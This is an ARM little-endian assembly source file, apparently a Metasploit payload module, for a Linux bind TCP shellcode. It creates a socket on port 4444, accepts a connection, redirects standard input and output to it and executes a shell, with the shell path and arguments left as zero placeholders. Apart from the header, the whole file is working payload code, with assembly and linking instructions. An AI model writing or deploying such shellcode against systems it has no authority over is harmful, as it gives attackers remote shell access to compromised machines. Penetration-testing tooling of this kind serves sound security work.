@@
@
@        Name: single_sock_bind
@   Qualities: -
@     Authors: civ, repmovsb
@     License: MSF_LICENSE
@ Description:
@
@        Implementation of a Linux bind TCP shellcode for ARM LE architecture.
@
@        This source is built from the payload module (instead of other way around...)
@
@        Assemble with: as single_sock_bind.s -o single_sock_bind.o
@        Link with:     ld single_sock_bind.o -o single_sock_bind
@
@ Meta-Information:
@
@ meta-shortname=Linux Bind TCP
@ meta-description=Listen on a port for a connection and run a second stage
@ meta-authors=civ, repmovsb
@ meta-os=linux
@ meta-arch=armle
@ meta-category=singles
@ meta-connection-type=bind
@ meta-name=bind_tcp
@@

.text
.globl _start
_start:
@ int socket(int domain, int type, int protocol);
@ socket(2,1,6)
       mov     r0, #2
       mov     r1, #1
       mov     r2, #6
       mov     r7, #1
       lsl     r7, r7, #8
       add     r7, r7, #25
       svc     0
       mov     r6, r0

@ bind
       add     r1, pc, #128
       mov     r2, #16
       mov     r7, #1
       lsl     r7, r7, #8
       add     r7, r7, #26
       svc     0

@ listen
       mov     r0, r6
       mov     r7, #1
       lsl     r7, r7, #8
       add     r7, r7, #28
       svc     0

@ accept
       mov     r0, r6
       sub     r1, r1, r1
       sub     r2, r2, r2
       mov     r7, #1
       lsl     r7, r7, #8
       add     r7, r7, #29
       svc     0

@ dup
       mov     r6, r0
       mov     r1, #2
loop:
       mov     r0, r6
       mov     r7, #63
       svc     0
       subs    r1, r1, #1 
       bpl     loop

@ execve(SHELL, [ARGV0], [NULL])
       add     r0, pc, #36
       eor     r4, r4, r4
       push    {r4}
       mov     r2, sp
       add     r4, pc, #36
       push    {r4}
       mov     r1, sp
       mov     r7, #11
       svc     0

@ addr
@ port: 4444 , sin_fam = 2
.word   0x5c110002
@ ip: 0.0.0.0
.word   0x00000000

@ SHELL
.word 0x00000000 @ the shell goes here!
.word 0x00000000
.word 0x00000000
.word 0x00000000
@ ARGV0
.word 0x00000000 @ the args!
.word 0x00000000
.word 0x00000000
.word 0x00000000
